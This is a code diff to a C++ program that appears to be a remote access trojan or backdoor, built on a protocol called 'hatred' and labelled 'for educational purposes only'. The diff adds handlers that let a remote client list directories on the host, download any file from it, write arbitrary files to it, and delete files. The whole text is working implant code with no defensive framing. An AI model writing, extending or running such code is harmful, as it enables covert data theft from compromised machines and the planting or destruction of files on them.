@@ -1,10 +1,14 @@
 // decay range: 0xbd55, next: 0xbd55:4
 // for educational purposes only
 
+#include "../common/config.h"
+
 #include <charconv>
 #include <functional>
 #include <list>
 #include <random>
+#include <filesystem>
+#include <system_error>
 #ifdef __WIN32
 #include <thread>
 #endif
@@ -42,9 +46,7 @@
 #endif
 
 #define MAX_PORT 65535
-
 #define IPV4_ADDR_STR_LEN 16
-
 #define PROTO_INET 0
 
 using namespace hatred;
@@ -711,8 +713,126 @@ int main(int argc, const char** argv) {
                             exit(0);
                         }
 #endif
-                    } 
+                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::GETDIR) {
+                        proto::hatred_getdir req;
+                        if (!proto::hatred_getdir::recv(client, req)) {
+                            std::error_code err;
+                            std::filesystem::directory_entry dir(req.name, err);
 
+                            if (!err) {
+                                if (std::filesystem::is_directory(dir, err)) {
+                                    proto::hatred_dir d = {};
+                                    for (auto const& ent : std::filesystem::directory_iterator(dir, err)) {
+                                        proto::hatred_finfo f = {};
+                                        f.name = ent.path().filename();
+                                        if (ent.is_directory()) f.type = (int)proto::hatred_ftype::DIR;
+                                        else                    f.type = (int)proto::hatred_ftype::FILE;
+                                        d.content.push_back(f);
+                                    }
+
+                                    proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::DIRDT}.send(client);
+                                    d.send(client);
+                                } else proto::send_error(client, make_error_code(std::errc::not_a_directory));
+                            } else proto::send_error(client, err);
+                        }
+                        //if (std::filesystem::exists())
+                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::GETFILE) {
+                        proto::hatred_getfile req;
+                        if (!proto::hatred_getfile::recv(client, req)) {
+                            FILE* file = fopen(req.name.c_str(), "r");
+
+                            if (file) {
+                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ACK}.send(client);
+
+                                char* chunk = new char[STREAM_CHUNK_SIZE];
+
+                                while (size_t csiz = fread(chunk, 1, STREAM_CHUNK_SIZE, file)) {
+                                    proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::STREAM}.send(client);
+                                    proto::hatred_stream{.fno = 0, .data = std::string(chunk, csiz)}.send(client);
+                                }
+
+                                delete[] chunk;
+
+                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::STREAM}.send(client);
+                                proto::hatred_stream{.fno = 0, .data = ""}.send(client);
+
+                                fclose(file);
+                            } else {
+                                DPERROR("fopen()");
+                                proto::send_error(client, std::make_error_code(std::errc(errno)));
+                            }
+                        }
+                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::PUTFILE) {
+                        __label__ abrt;
+                        proto::hatred_putfile req;
+                        if (!proto::hatred_putfile::recv(client, req)) {
+                            FILE* file = fopen(req.name.c_str(), "w");
+
+                            if (file) {
+                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ACK}.send(client);
+
+                                while (1) {
+                                    proto::hatred_hdr hdr;
+                                    if (!proto::hatred_hdr::recv(client, hdr)) {
+                                        if (proto::hatred_op(hdr.op) == proto::hatred_op::STREAM) {
+                                            proto::hatred_stream sd;
+                                            if (!proto::hatred_stream::recv(client, sd)) {
+                                                if (sd.data.size() == 0) break;
+                                                if (fwrite(sd.data.c_str(), 1, sd.data.size(), file) == -1) {
+                                                    DPERROR("fwrite()");
+                                                    fclose(file);
+                                                    std::error_code err;
+                                                    std::filesystem::remove(req.name, err);
+                                                    goto abrt;
+                                                }
+                                            } else break;
+                                        } else break;
+                                    } else break;
+                                }
+
+                                fclose(file);
+                            } else {
+                                DPERROR("fopen()");
+                                proto::send_error(client, std::make_error_code(std::errc(errno)));
+                            }
+                        } abrt:;
+                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::RMFILE) {
+                        __label__ abrt;
+                        proto::hatred_rmfile req;
+                        if (!proto::hatred_rmfile::recv(client, req)) {
+                            std::error_code err;
+                            if (std::filesystem::exists(req.name, err) && !err) {
+                                if (std::filesystem::is_directory(req.name, err) && !err) {
+                                    if (!std::filesystem::is_empty(req.name, err) && !err) {
+                                        proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ERROR}.send(client);
+                                        proto::hatred_error{.what = proto::hatred_errno::NEMPTY}.send(client);
+                                        goto abrt;
+                                    } else if (err) {
+                                        proto::send_error(client, err);
+                                        goto abrt; 
+                                    }
+                                } else if (err) {
+                                    proto::send_error(client, err);
+                                    goto abrt; 
+                                }
+
+                                if (!(std::filesystem::remove(req.name, err) && !err)) {
+                                    proto::send_error(client, err);
+                                    goto abrt;
+                                }
+
+                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ACK}.send(client);
+                            } else if (err) {
+                                proto::send_error(client, err); 
+                                goto abrt;
+                            } else {
+                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ERROR}.send(client); 
+                                proto::hatred_error{.what = proto::hatred_errno::NEXIST}.send(client);
+                                goto abrt;
+                            }
+                        } abrt:;
+                    }
+                    
                     DPRINTF("cycle\n");
                 }
 
